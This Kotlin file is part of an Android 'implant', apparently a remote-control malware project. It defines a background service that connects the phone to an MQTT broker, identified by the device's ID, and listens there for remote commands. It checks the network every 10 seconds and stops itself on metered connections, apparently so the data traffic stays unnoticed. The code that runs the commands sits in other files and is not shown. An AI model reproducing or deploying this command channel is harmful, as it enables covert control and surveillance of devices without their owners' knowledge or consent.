package com.cooperthecoder.implant.command

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.util.Log
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.Networking
import com.cooperthecoder.implant.data.DeviceProperties
import org.eclipse.paho.android.service.MqttAndroidClient
import java.util.concurrent.TimeUnit

class CommandService : Service() {

    companion object {
        val TAG: String = CommandService::class.java.name
        val HEARTBEAT_INTERVAL = TimeUnit.SECONDS.toMillis(10)

        fun intent(context: Context): Intent {
            val intent = Intent(context, CommandService::class.java)
            return intent
        }
    }


    val client: MqttAndroidClient by lazy {
        val clientId = DeviceProperties.deviceId(this)
        MqttAndroidClient(applicationContext, Config.MQTT_BROKER, clientId)
    }

    val mainHandler = Handler()

    val heartbeatTask: Runnable = Runnable {
        if (Networking.isMeteredNetwork(this@CommandService)) {
            Log.d(TAG, "Metered network detected.")
            this@CommandService.onMeteredConnection()
        } else {
            Log.d(TAG, "Network still unmetered, checking again in $HEARTBEAT_INTERVAL ms")
            this@CommandService.heartbeat()
        }
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        Log.d(TAG, "Connecting to MQTT broker")
        openCommandChannel()
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        closeCommandChannel()
        Log.d(TAG, "Command listener stopped.")
        super.onDestroy()
    }

    private fun openCommandChannel() {
        val commandConnectionListener = CommandConnectionListener(
                client,
                DeviceProperties.identifier(this)
        )
        val commandMessageCallback = CommandMessageCallback(client, applicationContext)
        client.setCallback(commandMessageCallback)
        client.connect(null, commandConnectionListener)
        heartbeat()
    }

    private fun heartbeat() {
        mainHandler.postDelayed(heartbeatTask, HEARTBEAT_INTERVAL)
    }


    private fun closeCommandChannel() {
        client.close()
    }

    private fun onMeteredConnection() {
        Log.d(TAG, "Network is metered. Stopping CommandService.")
        mainHandler.removeCallbacks(heartbeatTask)
        stopSelf()
    }
}

